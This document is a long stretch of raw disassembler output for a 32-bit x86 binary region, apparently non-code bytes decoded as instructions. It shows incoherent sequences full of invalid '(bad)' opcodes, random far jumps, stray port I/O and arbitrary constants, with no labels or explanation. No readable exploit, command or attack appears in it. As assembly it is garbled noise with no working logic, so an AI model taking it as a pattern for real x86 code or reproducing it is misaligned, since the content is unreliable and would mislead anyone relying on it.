  427f7c:	jmp    0x8da79482
  427f81:	ins    BYTE PTR es:[edi],dx
  427f82:	jge    0x427fc3
  427f84:	push   edx
  427f85:	test   eax,0xc48cb0b
  427f8a:	dec    edi
  427f8b:	lea    ebx,[ebx]
  427f8d:	mov    ecx,0x38733929
  427f92:	inc    esp
  427f93:	mov    edi,0xdb4018aa
  427f98:	dec    ebp
  427f99:	(bad)  
  427f9a:	fdivrp st(3),st
  427f9c:	or     ah,bh
  427f9e:	sub    BYTE PTR [eax-0x60bd5a85],cl
  427fa4:	add    DWORD PTR [ecx-0x74],esi
  427fa7:	in     al,dx
  427fa8:	and    ebx,esp
  427faa:	add    DWORD PTR [eax],eax
  427fac:	push   ebx
  427fad:	xor    DWORD PTR [ecx],ebx
  427faf:	sub    dl,BYTE PTR [ebx]
  427fb1:	ss and DWORD PTR ss:0x21bf6fe6,ecx
  427fb9:	dec    esp
  427fba:	pop    es
  427fbb:	data16 mul dh
  427fbe:	repnz les esp,FWORD PTR [ecx-0x37a57573]
  427fc5:	inc    ebp
  427fc6:	les    esi,FWORD PTR [edi-0x50]
  427fc9:	mov    cl,0xf2
  427fcb:	mov    dl,0x33
  427fcd:	mov    ecx,0x766a14c8
  427fd2:	retf   
  427fd3:	push   esp
  427fd4:	scas   eax,DWORD PTR es:[edi]
  427fd5:	dec    ebx
  427fd6:	mov    al,ds:0x55fa7298
  427fdb:	sahf   
  427fdc:	xchg   ebp,eax
  427fdd:	jb     0x427fde
  427fdf:	enter  0x1a5a,0x95
  427fe3:	sub    bh,BYTE PTR [edx]
  427fe5:	ret    0x7ea8
  427fe8:	cmp    al,BYTE PTR [ecx]
  427fea:	or     ah,BYTE PTR [edx+0xd3a6]
	...
  428054:	add    BYTE PTR [eax],al
  428056:	mov    cl,0xa7
  428058:	dec    ebx
  428059:	das    
  42805a:	pop    edi
  42805b:	out    dx,eax
  42805c:	cmc    
  42805d:	mov    edi,0x22b0803f
  428062:	pop    eax
  428063:	cld    
  428064:	or     eax,0x1ad67e5
  428069:	add    BYTE PTR [eax],al
  42806b:	add    DWORD PTR [eax],eax
  42806d:	add    BYTE PTR [edx-0x10],bl
  428070:	xlat   BYTE PTR ds:[ebx]
  428071:	test   ebp,0x7ae8535e
  428077:	scas   eax,DWORD PTR es:[edi]
  428078:	or     esi,DWORD PTR [edx-0x5d]
  42807b:	push   ebx
  42807c:	inc    ebx
  42807d:	jbe    0x428032
  42807f:	push   edx
  428080:	jmp    0x7d7b81b9
  428085:	out    dx,al
  428086:	xchg   ebx,eax
  428087:	push   cs
  428088:	cmp    edx,edi
  42808a:	pop    edi
  42808b:	push   edi
  42808c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42808d:	add    al,0x9b
  42808f:	pop    eax
  428090:	inc    ebx
  428091:	inc    edi
  428092:	xchg   ebx,eax
  428093:	popa   
  428094:	cdq    
  428095:	mov    al,ds:0x2d86750c
  42809a:	jae    0x4280e0
  42809c:	ret    0x277d
  42809f:	daa    
  4280a0:	mov    gs,WORD PTR [ebx-0x1]
  4280a3:	ja     0x42803e
  4280a5:	out    dx,al
  4280a6:	rol    esi,0xb6
  4280a9:	dec    edi
  4280aa:	jmp    0xefcf87b5
  4280af:	neg    DWORD PTR [eax+ecx*2-0x42]
  4280b3:	enter  0x6205,0xc7
  4280b7:	inc    ebx
  4280b8:	nop
  4280b9:	(bad)  
  4280ba:	sub    esi,DWORD PTR [ecx+0x75]
  4280bd:	jle    0x42811a
  4280bf:	sbb    BYTE PTR [eax+eiz*1],0x1c
  4280c3:	(bad)  
  4280c4:	(bad)  
  4280c5:	loope  0x4280e8
  4280c7:	repnz mov al,0x98
  4280ca:	sti    
  4280cb:	xor    eax,0xa864a5e4
  4280d0:	addr16 jbe 0x42808e
  4280d3:	mov    edx,0xe5df128e
  4280d8:	bound  eax,QWORD PTR cs:[ebx-0x3f]
  4280dc:	frstor ds:0x81f9e6e7
  4280e2:	mov    edx,0x45650154
  4280e7:	les    eax,FWORD PTR [edi+ecx*1]
  4280ea:	push   edx
  4280eb:	jbe    0x4280f4
  4280ed:	adc    DWORD PTR ds:0xa5a15d67,eax
  4280f3:	cli    
  4280f4:	push   cs
  4280f5:	pop    ebx
  4280f6:	mov    ds:0xe69bf75,al
  4280fb:	int3   
  4280fc:	(bad)  
  4280fd:	arpl   cx,sp
  4280ff:	dec    esi
  428100:	ficom  DWORD PTR [ebx-0x15613fa8]
  428106:	in     al,dx
  428107:	mov    bl,0x40
  428109:	inc    edi
  42810a:	mov    al,0xe1
  42810c:	mov    edx,DWORD PTR [eax]
  42810e:	fiadd  WORD PTR [ebp+0xe891350]
  428114:	push   edx
  428115:	inc    ebp
  428116:	cmp    eax,0x286df284
  42811b:	mov    ebx,0xfe2e4cb5
  428120:	les    esp,FWORD PTR [ebx-0xb]
  428123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428124:	icebp  
  428125:	mov    gs,WORD PTR [esi-0x38bcb71e]
  42812b:	add    bh,BYTE PTR [ebx-0x74]
  42812e:	inc    esp
  42812f:	mov    cl,0x3a
  428131:	in     eax,0x71
  428133:	adc    bl,dl
  428135:	ret    0x3963
  428138:	mov    dh,0x22
  42813a:	mov    DWORD PTR ds:0xb1b55638,esi
  428140:	in     al,0x67
  428142:	aas    
  428143:	test   ebx,0x6b011ace
  428149:	sbb    DWORD PTR [edi+0x67],edi
  42814c:	cld    
  42814d:	icebp  
  42814e:	sahf   
  42814f:	xchg   edx,eax
  428150:	lahf   
  428151:	xor    edx,DWORD PTR [eax+0x57ff1dc8]
  428157:	push   cs
  428158:	test   esi,edi
  42815a:	int3   
  42815b:	jnp    0x42819d
  42815d:	pop    ss
  42815e:	dec    ecx
  42815f:	pop    ecx
  428160:	aam    0xc9
  428162:	dec    ebp
  428163:	cwde   
  428164:	mov    esi,0x879d6e9f
  428169:	jle    0x42818b
  42816b:	mov    esi,0x127e
	...
  4281d4:	add    BYTE PTR [eax],al
  4281d6:	fucomip st,st(6)
  4281d8:	std    
  4281d9:	dec    esp
  4281da:	std    
  4281db:	pop    edi
  4281dc:	(bad)  
  4281dd:	call   FWORD PTR [edx]
  4281df:	xchg   edi,eax
  4281e0:	pop    esp
  4281e1:	push   ecx
  4281e2:	push   ebp
  4281e3:	inc    edx
  4281e4:	test   eax,0x1ae67f0
  4281e9:	add    BYTE PTR [eax],al
  4281eb:	add    DWORD PTR [eax],eax
  4281ed:	add    ch,cl
  4281ef:	enter  0x1700,0xcc
  4281f3:	fidiv  DWORD PTR [edx+0x71]
  4281f6:	or     BYTE PTR [ebp-0x72d371a3],al
  4281fc:	mov    al,0x1
  4281fe:	pop    edi
  4281ff:	scas   al,BYTE PTR es:[edi]
  428200:	cmp    eax,0xa218ee70
  428205:	jmp    0x428187
  428207:	mov    edi,0x8e50525a
  42820c:	adc    ebp,DWORD PTR [ecx]
  42820e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42820f:	addr16 int 0x34
  428212:	mov    eax,0x48d98d02
  428217:	outs   dx,BYTE PTR ds:[esi]
  428218:	xchg   esi,eax
  428219:	rcr    esi,cl
  42821b:	and    eax,0xa7bc95f0
  428220:	sub    ah,BYTE PTR [esi]
  428222:	inc    ebx
  428223:	push   ds
  428224:	adc    DWORD PTR [eax],eax
  428226:	cmp    dl,BYTE PTR [edi]
  428228:	in     eax,dx
  428229:	add    BYTE PTR [esi+0x55eadd45],al
  42822f:	cdq    
  428230:	hlt    
  428231:	scas   al,BYTE PTR es:[edi]
  428232:	sub    eax,0xdcf2b20b
  428237:	pop    ebp
  428238:	xchg   al,ch
  42823a:	retf   0x7c76
  42823d:	push   cs
  42823e:	int3   
  42823f:	adc    DWORD PTR [ecx+0x27873850],0xffffffee
  428246:	ds retf 
  428248:	(bad)  
  428249:	push   edi
  42824a:	arpl   WORD PTR [ecx],bp
  42824c:	iret   
  42824d:	or     al,0x10
  42824f:	cdq    
  428250:	inc    ecx
  428251:	in     al,dx
  428252:	imul   esi,DWORD PTR [ecx+0x437b5484],0x7710524e
  42825c:	icebp  
  42825d:	add    al,0xef
  42825f:	mov    al,0xd9
  428261:	mov    dl,0xd9
  428263:	mov    edx,0x11b8a497
  428268:	addr16 in eax,0x1b
  42826b:	or     al,0xd1
  42826d:	jo     0x428202
  42826f:	jmp    0x55d5:0x37bcd846
  428276:	inc    edi
  428277:	inc    ebp
  428278:	cmc    
  428279:	cmovb  edi,DWORD PTR [edx-0x4a]
  42827d:	jmp    0x471308f
  428282:	xor    al,0xf3
  428284:	mov    edx,0x73c60ef7
  428289:	loopne 0x4282bb
  42828b:	loopne 0x428289
  42828d:	retf   0x2037
  428290:	pusha  
  428291:	mov    bh,0x92
  428293:	pop    ss
  428294:	push   ebp
  428295:	test   al,0x2e
  428297:	pop    ss
  428298:	rcl    ah,0xfc
  42829b:	jns    0x4282dc
  42829d:	mov    dh,0x78
  42829f:	dec    ebx
  4282a0:	dec    edi
  4282a1:	(bad)  
  4282a2:	mov    ebx,0x82778f4c
  4282a7:	push   0xffffffd8
  4282a9:	pop    es
  4282aa:	dec    ebx
  4282ab:	add    BYTE PTR [edi+ebp*8],bl
  4282ae:	fidivr WORD PTR [eax+esi*4]
  4282b1:	aaa    
  4282b2:	(bad)  
  4282b3:	xor    al,0x5e
  4282b5:	setns  BYTE PTR [esi]
  4282b8:	adc    dh,BYTE PTR [edi-0x3b]
  4282bb:	aad    0x78
  4282bd:	push   eax
  4282be:	call   0x6c89:0xcc678472
  4282c5:	mov    bl,0x40
  4282c7:	pop    edi
  4282c8:	adc    BYTE PTR ds:0x22136044,ah
  4282ce:	adc    cl,BYTE PTR ds:0xa72587c7
  4282d4:	pop    esp
  4282d5:	(bad)  
  4282d6:	xlat   BYTE PTR ds:[ebx]
  4282d7:	out    dx,al
  4282d8:	mov    al,0xe1
  4282da:	jne    0x428319
  4282dc:	aas    
  4282dd:	sub    DWORD PTR [eax],eax
  4282df:	pusha  
  4282e0:	xchg   ebp,eax
  4282e1:	add    ah,BYTE PTR [eax+ebp*2-0x11]
  4282e5:	call   esp
  4282e7:	sub    BYTE PTR [edi-0x75671b],ch
  4282ed:	ja     0x4282ef
	...
  428353:	add    BYTE PTR [eax],al
  428355:	add    bh,al
  428357:	fidiv  WORD PTR [esi]
  428359:	loop   0x42839a
  42835b:	jmp    0x5c37:0x7b70ffd7
  428362:	cmp    ecx,DWORD PTR [edi-0x50984f52]
  428368:	add    DWORD PTR [eax],eax
  42836a:	add    BYTE PTR [ecx],al
  42836c:	add    BYTE PTR [eax],al
  42836e:	cmp    eax,0x5b619481
  428373:	scas   al,BYTE PTR es:[edi]
  428374:	cmp    ch,bl
  428376:	cwde   
  428377:	imul   esi,DWORD PTR [esi],0x18
  42837a:	inc    ebp
  42837b:	push   0x3a67ba8
  428380:	adc    eax,0xa4ae394b
  428385:	popa   
  428386:	add    eax,0xe04a15aa
  42838b:	popa   
  42838c:	xor    bh,BYTE PTR [ecx+edx*1-0x42]
  428390:	and    eax,0x6037c618
  428395:	dec    ebp
  428396:	fwait
  428397:	imul   edx,DWORD PTR [esi-0x52],0x3667d6a0
  42839e:	lock outs dx,DWORD PTR ds:[esi]
  4283a0:	sahf   
  4283a1:	pop    esp
  4283a2:	iret   
  4283a3:	fild   DWORD PTR [ebp-0xce37c8e]
  4283a9:	das    
  4283aa:	dec    ebp
  4283ab:	cmp    cl,dl
  4283ad:	push   ebx
  4283ae:	js     0x428361
  4283b0:	dec    esp
  4283b1:	sbb    al,0xf4
  4283b3:	fnstsw WORD PTR [eax]
  4283b5:	pop    eax
  4283b6:	adc    bl,BYTE PTR [edi]
  4283b8:	and    BYTE PTR [edx-0x227b82e8],0x32
  4283bf:	sbb    DWORD PTR [ecx+eax*1-0x7d],ecx
  4283c3:	add    esi,0x6b
  4283c6:	mov    edx,DWORD PTR [esi-0x34]
  4283c9:	loopne 0x42843f
  4283cb:	ins    BYTE PTR es:[edi],dx
  4283cc:	inc    esi
  4283cd:	cmp    eax,0x9e442a4c
  4283d2:	and    al,0xbd
  4283d4:	ret    0x1407
  4283d7:	pop    ss
  4283d8:	adc    BYTE PTR [ebx+0x21],al
  4283db:	in     eax,0xc3
  4283dd:	jmp    0x5966:0x93210e1a
  4283e4:	jbe    0x428371
  4283e6:	loopne 0x428428
  4283e8:	ror    dl,cl
  4283ea:	fild   QWORD PTR [eax+0x2952ac40]
  4283f0:	xor    al,0xa6
  4283f2:	icebp  
  4283f3:	fs jno 0x4283a2
  4283f6:	xchg   edi,eax
  4283f7:	mov    edx,0xdd48c77a
  4283fc:	leave  
  4283fd:	sub    ebp,DWORD PTR [ebx]
  4283ff:	inc    esi
  428400:	fdiv   QWORD PTR [ebx]
  428402:	mov    ch,0x4e
  428404:	sub    eax,eax
  428406:	push   DWORD PTR [edi]
  428408:	in     al,dx
  428409:	out    dx,eax
  42840a:	(bad)  
  42840b:	sub    al,0xe3
  42840d:	pusha  
  42840e:	lds    eax,FWORD PTR [edi]
  428410:	mov    ecx,0xe5424799
  428415:	jl     0x4283de
  428417:	bts    ecx,edi
  42841a:	retf   0x4526
  42841d:	xchg   ebp,eax
  42841e:	enter  0x9cbe,0x16
  428422:	mov    ds:0x1c684d8b,al
  428427:	xchg   ecx,eax
  428428:	fistp  WORD PTR [ecx+0x419c6a62]
  42842e:	popf   
  42842f:	dec    BYTE PTR [ecx]
  428431:	jo     0x428437
  428433:	sub    eax,0x3e3958ec
  428438:	xor    BYTE PTR [edx-0x623fd53c],dl
  42843e:	push   ss
  42843f:	scas   al,BYTE PTR es:[edi]
  428440:	(bad)  
  428441:	mov    esp,0x63c97abf
  428446:	cmp    bh,BYTE PTR [ecx+0x600c91c9]
  42844c:	sub    al,dh
  42844e:	rcr    BYTE PTR [edi],0xd4
  428451:	fcomp  QWORD PTR [ebx]
  428453:	bound  esi,QWORD PTR [eax]
  428455:	sti    
  428456:	call   0x29c4d5cc
  42845b:	cmp    esp,DWORD PTR [ecx+ebx*1]
  42845e:	or     DWORD PTR ds:[ebx-0x4d],esi
  428462:	inc    edi
  428463:	clc    
  428464:	mov    ?,ebp
  428466:	xor    BYTE PTR [esp+edx*8-0x39],bh
  42846a:	mov    ds:0x4c36e3,eax
	...
  4284d3:	add    BYTE PTR [eax],al
  4284d5:	add    BYTE PTR [esi],cl
  4284d7:	xchg   esp,eax
  4284d8:	jg     0x42853d
  4284da:	(bad)  
  4284db:	jmp    0x4284fb
  4284dd:	std    
  4284de:	mov    edi,0xfcabfb32
  4284e3:	shl    DWORD PTR [ebx],0x14
  4284e6:	addr16 mov al,0x1
  4284e9:	add    BYTE PTR [eax],al
  4284eb:	add    DWORD PTR [eax],eax
  4284ed:	add    bl,dl
  4284ef:	adc    eax,0x8c48ee4c
  4284f4:	inc    edi
  4284f5:	jns    0x4284ed
  4284f7:	mov    BYTE PTR [ecx-0x65],bh
  4284fa:	adc    DWORD PTR cs:[edi-0x33],0xffffffe3
  4284ff:	mov    al,0x2b
  428501:	sub    al,0x38
  428503:	or     BYTE PTR [ecx+ecx*4-0x256ee2a6],dl
  42850a:	push   esi
  42850b:	mov    bh,0xa2
  42850d:	adc    al,0x4c
  42850f:	mov    edi,0xdf1eea0e
  428514:	push   ecx
  428515:	mov    DWORD PTR [ebx+ebp*2+0xa617db8],ecx
  42851c:	and    al,0xe6
  42851e:	xchg   DWORD PTR [eax],esp
  428520:	clc    
  428521:	fidivr DWORD PTR [ebp+0xf]
  428524:	jbe    0x4284b4
  428526:	lea    ebx,[edx+edi*4+0x78b75ed8]
  42852d:	cmp    bh,BYTE PTR [ebp+0x27d14031]
  428533:	adc    BYTE PTR [ecx],cl
  428535:	call   0x37127e84
  42853a:	retf   0x2bce
  42853d:	ret    0x3a0d
  428540:	ss or  al,0xf7
  428543:	mov    ecx,0x6e98e7e0
  428548:	inc    esp
  428549:	shr    BYTE PTR [edx],cl
  42854b:	or     ah,BYTE PTR [eax]
  42854d:	rcl    DWORD PTR [edx-0x6b61d598],0xab
  428554:	or     ah,BYTE PTR [esi-0x46]
  428557:	xchg   esi,eax
  428558:	and    DWORD PTR [ecx],edi
  42855a:	bswap  eax
  42855c:	mov    esp,0x2e738d0d
  428561:	push   DWORD PTR [edi]
  428563:	inc    esp
  428564:	scas   al,BYTE PTR es:[edi]
  428565:	fistp  QWORD PTR [ebx+0x359a3560]
  42856b:	cli    
  42856c:	push   ebx
  42856d:	mov    eax,ds:0x3bcf3b85
  428572:	mov    dh,0x92
  428574:	sar    al,cl
  428576:	out    dx,eax
  428577:	or     al,0xcb
  428579:	pop    es
  42857a:	(bad)  [edx+0x5d]
  42857d:	iret   
  42857e:	jge    0x42856d
  428580:	cdq    
  428581:	pop    edx
  428582:	shl    ecx,0xb4
  428585:	fcomp  DWORD PTR ds:0xc7213031
  42858b:	cli    
  42858c:	int3   
  42858d:	aad    0x9a
  42858f:	(bad)  
  428590:	jmp    0x428562
  428592:	cs xchg ecx,eax
  428594:	adc    BYTE PTR [eax+ecx*2],0x11
  428598:	outs   dx,DWORD PTR ds:[esi]
  428599:	add    cl,cl
  42859b:	xor    cl,BYTE PTR [edx+0x71ae9796]
  4285a1:	push   ebx
  4285a2:	xchg   DWORD PTR [ebx],ebx
  4285a4:	inc    ecx
  4285a5:	(bad)  
  4285a6:	in     eax,0x1
  4285a8:	loop   0x4285e6
  4285aa:	sub    DWORD PTR [ebx-0x7e],eax
  4285ad:	xlat   BYTE PTR ds:[ebx]
  4285ae:	inc    ebx
  4285af:	out    dx,al
  4285b0:	(bad)  
  4285b1:	fdiv   QWORD PTR [edx+0x42d6d878]
  4285b7:	inc    edx
  4285b8:	in     al,dx
  4285b9:	inc    edi
  4285ba:	xchg   DWORD PTR [ecx],esi
  4285bc:	xchg   ecx,eax
  4285bd:	scas   al,BYTE PTR es:[edi]
  4285be:	fstp   TBYTE PTR [edx+edx*2+0x5623f564]
  4285c5:	ins    DWORD PTR es:[edi],dx
  4285c6:	ja     0x428618
  4285c8:	and    eax,0x92fd2c00
  4285cd:	rcr    DWORD PTR [ecx-0xa],1
  4285d0:	call   0x9e692215
  4285d5:	mov    ah,BYTE PTR [edi+0x29]
  4285d8:	jmp    0x4be3:0xf0a49ef8
  4285df:	xchg   esi,eax
  4285e0:	inc    esi
  4285e1:	sbb    eax,0xc712f986
  4285e6:	or     ch,BYTE PTR [ebp+0x18]
  4285e9:	mov    ebx,0xaa574f17
	...
  428656:	push   ecx
  428657:	div    BYTE PTR ds:0x5bffb73e
  42865d:	inc    edi
  42865f:	mov    esi,0xf764a3f6
  428664:	sbb    ch,BYTE PTR [ebp+0x67]
  428667:	mov    cl,0x1
  428669:	add    BYTE PTR [eax],al
  42866b:	add    DWORD PTR [eax],eax
  42866d:	add    BYTE PTR [ebx],ah
  42866f:	pusha  
  428670:	jmp    0x177c469a
  428675:	and    ecx,esp
  428677:	mov    cl,0xbb
  428679:	mov    esp,0x3a6df863
  42867e:	adc    dl,bh
  428680:	stos   DWORD PTR es:[edi],eax
  428681:	xor    BYTE PTR [esi-0x5b],bh
  428684:	in     eax,0x4a
  428686:	rol    BYTE PTR [eax-0x25],cl
  428689:	xchg   ebp,eax
  42868a:	fadd   QWORD PTR [ebx+eax*4+0x46735c48]
  428691:	pusha  
  428692:	fabs   
  428694:	xchg   ebx,eax
  428695:	daa    
  428696:	lock nop
  428698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428699:	sbb    al,0x39
  42869b:	xchg   ebx,eax
  42869c:	popa   
  42869d:	dec    ecx
  42869e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42869f:	mov    edi,0xb9ef6eae
  4286a4:	paddusw mm2,QWORD PTR [eax+edx*4]
  4286a8:	jne    0x42869b
  4286aa:	cld    
  4286ab:	fisub  WORD PTR [edx-0x66c2d767]
  4286b1:	inc    ecx
  4286b2:	xchg   ebp,eax
  4286b3:	or     al,0xee
  4286b5:	(bad)  
  4286b6:	iret   
  4286b7:	push   0xfffffffd
  4286b9:	(bad)  
  4286ba:	in     al,dx
  4286bb:	push   esp
  4286bc:	bound  esi,QWORD PTR [eax]
  4286be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4286bf:	fiadd  WORD PTR [ebx+0x71c909b4]
  4286c5:	pop    ebp
  4286c6:	add    BYTE PTR [eax+0x2ee54995],bl
  4286cc:	ds dec eax
  4286ce:	(bad)  
  4286cf:	xor    al,BYTE PTR [edi-0x4b]
  4286d2:	mov    BYTE PTR [ebx+ebx*1],dl
  4286d5:	mov    eax,0x4b8399b8
  4286da:	mov    cl,0x39
  4286dc:	cs fwait
  4286de:	std    
  4286df:	sbb    DWORD PTR [eax+0x64],0xffffff97
  4286e3:	inc    ecx
  4286e4:	repnz push edi
  4286e6:	and    edi,ecx
  4286e8:	add    ecx,DWORD PTR [ebp+0x2]
  4286eb:	int3   
  4286ec:	inc    edi
  4286ed:	out    dx,al
  4286ee:	nop
  4286ef:	scas   al,BYTE PTR es:[edi]
  4286f0:	cmp    al,0xe5
  4286f2:	xor    BYTE PTR [esi],ch
  4286f4:	inc    eax
  4286f5:	dec    ebx
  4286f6:	into   
  4286f7:	mov    ebp,0xd3144c53
  4286fc:	ffreep st(2)
  4286fe:	outs   dx,DWORD PTR ds:[esi]
  4286ff:	not    bh
  428701:	inc    esi
  428702:	mov    edi,0xd27ac1cd
  428707:	cs aam 0x5a
  42870a:	mov    dl,0xeb
  42870c:	jmp    0x9b3df0
  428711:	push   ds
  428712:	jmp    FWORD PTR [eax+0x370cf75f]
  428718:	push   ebx
  428719:	aad    0x72
  42871b:	(bad)  
  42871c:	dec    ecx
  42871d:	mov    ah,0x1b
  42871f:	inc    eax
  428720:	inc    ebp
  428721:	jmp    0xb6b4a26b
  428726:	jmp    0x8341:0x599c3e5e
  42872d:	mov    BYTE PTR [esi],cl
  42872f:	and    ecx,edx
  428731:	add    ebp,eax
  428733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428734:	jns    0x42879b
  428736:	repz leave 
  428738:	jnp    0x428721
  42873a:	repnz xchg esi,eax
  42873c:	dec    ecx
  42873d:	xchg   ebp,eax
  42873e:	inc    edi
  42873f:	and    dl,dh
  428741:	es inc esi
  428743:	aas    
  428744:	fiadd  WORD PTR [esi*8-0x2c752427]
  42874b:	je     0x42875b
  42874d:	dec    esi
  42874e:	js     0x42872c
  428750:	jbe    0x428705
  428752:	mov    ebx,DWORD PTR [ecx+0x6d46919a]
  428758:	jnp    0x42878c
  42875a:	(bad)  
  42875b:	loop   0x428717
  42875d:	(bad)  [edx+0x726dbe8d]
  428763:	cld    
  428764:	or     al,0x55
  428766:	mov    ebx,DWORD PTR [esp+eiz*4+0x26bf7741]
  42876d:	pop    edi
	...
  4287d6:	push   esi
  4287d7:	pop    ebx
  4287d8:	xor    al,0x78
  4287da:	cmp    eax,0xe77f5e7f
  4287df:	inc    ebp
  4287e0:	call   0x2c000af8
  4287e5:	and    DWORD PTR [edi-0x4e],0x1000001
  4287ec:	add    BYTE PTR [eax],al
  4287ee:	sbb    al,0x96
  4287f0:	mov    bl,BYTE PTR [edx-0x71768d9a]
  4287f6:	into   
  4287f7:	shl    BYTE PTR [eax-0x24],0xd2
  4287fb:	fstp   st(5)
  4287fd:	add    esp,edi
  4287ff:	fist   WORD PTR [esi+0x2ff76a3]
  428805:	push   es
  428806:	push   cs
  428807:	mov    ebx,0xf4f9417f
  42880c:	aam    0xbe
  42880e:	repnz fwait
  428810:	cli    
  428811:	bound  edx,QWORD PTR [edx]
  428813:	outs   dx,BYTE PTR ds:[esi]
  428814:	cmp    BYTE PTR [ebx-0x6b38edb6],0xe3
  42881b:	cli    
  42881c:	fwait
  42881d:	or     eax,DWORD PTR [ebp+0x2b]
  428820:	mov    ds:0x80c720a3,eax
  428825:	push   ebp
  428826:	test   BYTE PTR [esp+ecx*8-0x1e],0x3
  42882b:	pop    ebx
  42882c:	int    0xef
  42882e:	pop    ebx
  42882f:	pop    es
  428830:	mov    al,ds:0x1ffb50
  428835:	lods   eax,DWORD PTR ds:[esi]
  428836:	ja     0x428873
  428838:	or     bl,BYTE PTR [ebp+edx*8+0x20]
  42883c:	xchg   edx,eax
  42883d:	and    edx,edi
  42883f:	mov    WORD PTR [esi-0x3499f70b],ss
  428845:	(bad)  
  428846:	jns    0x428845
  428848:	and    al,0x92
  42884a:	mov    bh,0x47
  42884c:	popf   
  42884d:	mov    DWORD PTR [ebx-0x745fe104],0xd590922e
  428857:	inc    esp
  428858:	mov    bl,bl
  42885a:	and    DWORD PTR [ebx],esi
  42885c:	test   eax,0x42e7cfbf
  428861:	jmp    0x42882a
  428863:	mov    eax,0xce77aa67
  428868:	(bad)  
  428869:	cld    
  42886a:	repnz mov si,0x696b
  42886f:	mov    eax,ds:0xccac1635
  428874:	cld    
  428875:	loope  0x4288e5
  428877:	ret    0x4e23
  42887a:	pop    ebx
  42887b:	fsub   DWORD PTR [ebx+0x4a]
  42887e:	inc    edx
  42887f:	outs   dx,BYTE PTR ds:[esi]
  428880:	cld    
  428881:	daa    
  428882:	mov    cl,0xd
  428884:	mov    ds:0xb29ed858,al
  428889:	fstp   st(3)
  42888b:	dec    esp
  42888c:	inc    esp
  42888d:	jno    0x4288be
  42888f:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  428891:	jno    0x428838
  428893:	adc    eax,0xf5850875
  428898:	out    dx,eax
  428899:	jo     0x428824
  42889b:	ret    
  42889c:	pop    edx
  42889d:	hlt    
  42889e:	mov    ds:0x60e3f096,eax
  4288a3:	cld    
  4288a4:	into   
  4288a5:	mov    edi,0x8c9229b1
  4288aa:	or     ch,al
  4288ac:	dec    ebx
  4288ad:	adc    al,BYTE PTR [edi-0x4c642341]
  4288b3:	mov    al,ds:0xfca635fa
  4288b9:	rcr    BYTE PTR [eax-0x72a57d2],1
  4288bf:	ins    BYTE PTR es:[edi],dx
  4288c0:	dec    ecx
  4288c1:	cmc    
  4288c2:	mov    dl,0xdf
  4288c4:	jne    0x428862
  4288c6:	std    
  4288c7:	cmp    eax,0xe7c65382
  4288cc:	call   0x5bd3d40f
  4288d1:	(bad)  
  4288d2:	js     0x42887c
  4288d4:	scas   eax,DWORD PTR es:[edi]
  4288d5:	in     eax,dx
  4288d6:	mov    edx,0xdb21d860
  4288db:	pushf  
  4288dc:	mov    bl,0xb2
  4288de:	retf   
  4288df:	pop    esp
  4288e0:	and    ebx,DWORD PTR [eax+ecx*2]
  4288e3:	icebp  
  4288e4:	push   eax
  4288e5:	scas   al,BYTE PTR es:[edi]
  4288e6:	out    0x7e,al
  4288e8:	jmp    0xaf:0xf11c1895
	...
  428953:	add    BYTE PTR [eax],al
  428955:	add    BYTE PTR [esi],ah
  428957:	jp     0x4289ca
  428959:	les    edi,FWORD PTR [ebp-0x31]
  42895c:	mov    bh,0xfa
  42895e:	arpl   WORD PTR [esi-0x5c2362f1],bx
  428964:	ret    0x679a
  428967:	mov    bl,0x1
  428969:	add    BYTE PTR [eax],al
  42896b:	add    DWORD PTR [eax],eax
  42896d:	add    BYTE PTR [ebx+0x15],dl
  428970:	xor    al,0xd
  428972:	mov    al,ds:0x23057e00
  428977:	add    al,0x29
  428979:	cdq    
  42897a:	dec    eax
  42897b:	lods   eax,DWORD PTR ds:[esi]
  42897c:	inc    edx
  42897d:	add    eax,0x775540e0
  428982:	mov    edi,0x59be517a
  428987:	mov    al,ds:0x445c950c
  42898c:	fs mov bh,0x7f
  42898f:	scas   al,BYTE PTR es:[edi]
  428990:	sar    DWORD PTR [edi],1
  428992:	jmp    0x45b8:0x49bea386
  428999:	daa    
  42899a:	lds    ebp,FWORD PTR [esi]
  42899c:	out    dx,al
  42899d:	retf   
  42899e:	js     0x4289c6
  4289a0:	je     0x4289f6
  4289a2:	arpl   WORD PTR [ebx+0x65],bp
  4289a5:	inc    ecx
  4289a6:	sbb    DWORD PTR [edi],0x32e8d3f6
  4289ac:	mov    bh,0xfc
  4289ae:	xchg   esi,eax
  4289af:	dec    edi
  4289b0:	iret   
  4289b1:	fiadd  DWORD PTR [ebx-0x63]
  4289b4:	lea    edi,[eax-0x31]
  4289b7:	inc    ebx
  4289b8:	xor    ebp,DWORD PTR [edi-0x4cde05fd]
  4289be:	bswap  edi
  4289c0:	xchg   cl,cl
  4289c2:	mov    ax,0xaddd
  4289c6:	test   eax,0xf04798d2
  4289cb:	adc    bh,cl
  4289cd:	and    bl,0xb
  4289d0:	data16 std 
  4289d2:	push   edx
  4289d3:	xor    esi,DWORD PTR [ecx]
  4289d5:	aaa    
  4289d6:	mov    ch,0x73
  4289d8:	stos   BYTE PTR es:[edi],al
  4289d9:	ja     0x428980
  4289db:	ret    
  4289dc:	retf   0x6fa1
  4289df:	cwde   
  4289e0:	dec    edi
  4289e1:	sub    eax,edi
  4289e3:	fstp   DWORD PTR [edx+edx*2-0x74]
  4289e7:	cld    
  4289e8:	in     al,dx
  4289e9:	adc    ebx,DWORD PTR [edi-0xc]
  4289ec:	sti    
  4289ed:	inc    esi
  4289ee:	nop
  4289ef:	addr16 mov ah,0xfa
  4289f2:	imul   esi,esi,0x2776ed8a
  4289f8:	enter  0x3842,0x98
  4289fc:	out    0x4b,eax
  4289fe:	or     BYTE PTR [ecx+0x6ce71ff],0x6f
  428a05:	imul   edx,DWORD PTR [edi],0x55
  428a08:	fsubrp st(0),st
  428a0a:	adc    esp,DWORD PTR [ebp-0x63f7a6d0]
  428a10:	push   0xffffffd7
  428a12:	add    eax,ebp
  428a14:	sub    ebx,DWORD PTR [eax+0x44d57741]
  428a1a:	lods   al,BYTE PTR ds:[esi]
  428a1b:	pop    esp
  428a1c:	pop    eax
